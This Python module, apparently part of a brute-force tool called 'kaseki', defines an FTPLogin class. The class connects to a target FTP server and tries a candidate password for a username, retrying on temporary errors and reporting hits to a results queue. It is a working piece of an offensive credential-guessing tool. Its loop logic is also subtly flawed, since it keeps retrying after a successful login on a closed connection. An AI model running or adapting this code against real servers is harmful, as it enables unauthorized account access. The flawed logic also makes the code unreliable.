import ftplib
import multiprocessing as mp
import queue as q
from typing import Union
from time import sleep
from termcolor import cprint

from random import random
from kaseki.bruteforce.login import Login
from kaseki.bruteforce.target import FTPTarget
from kaseki.utils import Signal, QueueData, ConcurrentQueue

class FTPLogin(Login):
    
    def __init__(self, target: FTPTarget, password: str, results_queue: ConcurrentQueue):
        self.target = target
        self.password = password
        self.results_queue = results_queue
        self.stop_flag = False
        self.ftps = ftplib.FTP()  # Class-level instance of FTP
        self.ftps.connect(self.target.hostname, port=target.protocol.port)

    def start(self) -> None:
        attempts: int = 0
        result: Signal = Signal.Blank

        while not self.stop_flag:

            try:
                self.ftps.login(user=self.target.username, passwd=self.password)
                result = Signal.Success
            except ftplib.error_perm:
                result = Signal.Failed
                break
            except ftplib.error_temp:
                attempts += 1
                sleep(0.3)
                continue
            finally:
                try:
                    self.ftps.quit()  # Ensure we quit the FTP connection
                except Exception as e:
                    break
                
        self.results_queue.put(
            QueueData(
                result,
                self.password
            )
        )
                    
    def stop(self) -> None:
        """Stop the login attempts."""
        self.stop_flag = True


__all__ = ['FTPLogin']